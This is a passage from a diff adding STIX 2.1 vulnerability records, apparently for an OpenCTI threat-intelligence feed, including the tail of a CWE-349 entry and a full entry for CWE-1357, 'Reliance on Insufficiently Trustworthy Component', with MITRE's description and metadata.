+            "external_references": [
+                {
+                    "source_name": "cwe",
+                    "url": "https://cwe.mitre.org/data/definitions/349",
+                    "external_id": "CWE-349"
+                }
+            ],
+            "x_opencti_id": "e399db49-5738-4bb3-9780-3a3eeaea9c2e",
+            "x_opencti_type": "Vulnerability",
+            "type": "vulnerability",
+            "created_by_ref": "identity--f11b0831-e7e6-5214-9431-ccf054e53e94",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
+            ]
+        },
+        {
+            "id": "vulnerability--36788e0c-7a4b-5e34-a894-5977650748a2",
+            "spec_version": "2.1",
+            "revoked": false,
+            "confidence": 15,
+            "created": "2023-02-16T21:24:57.841Z",
+            "modified": "2024-04-05T19:07:20.695Z",
+            "name": "[CWE-1357] Reliance on Insufficiently Trustworthy Component",
+            "description": "Many modern hardware and software products are built by combining multiple smaller components together into one larger entity, often during the design or architecture phase. For example, a hardware component might be built by a separate supplier, or the product might use an open-source software library from a third party. Regardless of the source, each component should be sufficiently trusted to ensure correct, secure operation of the product. If a component is not trustworthy, it can produce significant risks for the overall product, such as vulnerabilities that cannot be patched fast enough (if at all); hidden functionality such as malware; inability to update or replace the component if needed for security purposes; hardware components built from parts that do not meet specifications in ways that can lead to weaknesses; etc. Note that a component might not be trustworthy even if it is owned by the product vendor, such as a software component whose source code is lost and was built by developers who left the company, or a component that was developed by a separate company that was acquired and brought into the product's own company. Note that there can be disagreement as to whether a component is sufficiently trustworthy, since trust is ultimately subjective. Different stakeholders (e.g., customers, vendors, governments) have various threat models and ways to assess trust, and design/architecture choices might make tradeoffs between security, reliability, safety, privacy, cost, and other characteristics.",
+            "labels": [
+                "atlas"
+            ],
+            "external_references": [
+                {
+                    "source_name": "MITRE CWE",
+                    "url": "https://cwe.mitre.org/data/definitions/1357"
+                }
+            ],
+            "x_opencti_id": "1a90d749-4bd6-4fee-8307-aaf2f8830708",
+            "x_opencti_type": "Vulnerability",
+            "type": "vulnerability",
+            "created_by_ref": "identity--f11b0831-e7e6-5214-9431-ccf054e53e94",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
+            ]
+        }
+    ]
+}
